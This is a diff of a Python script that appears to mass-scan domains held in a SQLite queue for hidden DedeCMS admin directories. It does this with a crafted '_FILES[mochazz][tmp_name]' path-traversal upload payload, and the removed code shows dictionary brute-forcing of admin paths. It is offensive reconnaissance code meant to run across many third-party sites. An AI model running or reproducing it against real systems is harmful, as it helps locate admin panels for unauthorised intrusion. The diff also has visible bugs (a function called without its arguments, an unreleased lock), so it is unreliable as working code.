@@ -7,43 +7,42 @@
 import itertools
 import traceback
 from common import utils
+import threading
+import requests
 from threading import Thread
 import time
-import re
+import tldextract
 from unit import dbsqlite
 
-characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
-base_back_dict = utils.get_lines("./dict/织梦后台字典.txt")
 
 
-def try_common(domain):
-    back_dir_dict = []
-    s = domain.replace("http://", "").replace("https://", "")
-    n = len(s.split("."))
-    if n == 2:
-        path = s.split(".")[0]
-        back_dir_dict = [path, "admin_%s" % path, "dede_%s" % path, "ad_%s" % path, "bk_%s" % path,
-                         "background_%s" % path, "houtai_%s" % path, "%s_admin" % path, "%s_dede" % path,
-                         "%s_ad" % path, "%s_bk" % path, "%s_background" % path, "%s_houtai" % path]
-    if n >= 3:
-        for path in s.split(".")[:n - 1]:
-            back_dir_dict = [path, "admin_%s" % path, "dede_%s" % path, "ad_%s" % path, "bk_%s" % path,
-                             "background_%s" % path, "houtai_%s" % path, "%s_admin" % path, "%s_dede" % path,
-                             "%s_ad" % path, "%s_bk" % path, "%s_background" % path, "%s_houtai" % path]
-    back_dir_dict.extend(base_back_dict)
-    for back_dir in back_dir_dict:
-        print(domain + "/" + back_dir + "/login.php")
-        res = utils.my_requests(domain + "/" + back_dir + "/login.php", try_count=2)
-        if res and res.status_code == 200 and "login.php" in res.url:
-            res = {"domain": domain, "res": True, "info": back_dir}
-            return res
-    pass
+characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#@"
+min_group = 0
+thread_num = 1
+R = threading.Lock()
+
+
+def get_domains(status, num):
+    try:
+        R.acquire()
+        print("取数据")
+        domains = dbsqlite.start_getlist(' status = %s limit %d' % (status,num))
+        if len(domains) < min_group:
+            return
+        d_str = []
+        for domain in domains:
+            d_str.append(domain[1])
+        # dbsqlite.batch_data_update(d_str," status = 9")
+        R.release()
+        # return [[12,"http://dede.local.com"]]
+        return domains
+    except Exception as e:
+        R.release()
 
 
 def get_back_url(domain):
     back_dir = ""
     flag = 0
-    target_url = ""
     up_path = "./../{p}<</images/adminico.gif"
     data = {
         "_FILES[mochazz][tmp_name]": up_path,
@@ -112,38 +111,31 @@ def get_back_url(domain):
         return res
 
 
-def task():
+def task(i):
     while True:
-        domain_model = dbsqlite.start_getlist(' status = 7 ')
-        if not domain_model:
-            print('线程：%d为查到符合条件数据,等待3s' % i)
-            time.sleep(3)
-            continue
-        domain = domain_model[1]
-        res = get_back_url(domain)
-        if not res or not res["res"]:
-            result = try_common(domain)
-            if result['res']:
-                status = 6
-                des = result['res']
-            else:
-                status = 8
-                des = result['res']
-        else:
-            if res["res"]:
-                status = 6
-                des = res['res']
-            else:
-                status = 8
-                des = res['res']
-        dbsqlite.data_update(domain_model[1], "status = %d,des = '%s'" % (status, des))
+        try:
+            domain = get_domains()
+            if not domain:
+                print('线程：%d,未查到符合条件数据,等待60s...' % i)
+                time.sleep(10)
+                continue
+            domain = domain[0]
+            ress = get_back_url(domain[1])
+            for res in ress:
+                try:
+                    dbsqlite.data_update(res["domain"], "status = %d,des = '%s'" % (6, res["info"]))
+                except Exception as e:
+                    traceback.print_exc()
+        except Exception as e:
+            traceback.print_exc()
 
 
 if __name__ == '__main__':
     # task()
+    # try_common("http://www.dedecms.cn")
     try:
         Threads = []
-        for i in range(10):
+        for i in range(thread_num):
             t = Thread(target=task, args=(i,))
             t.daemon = 1
             Threads.append(t)
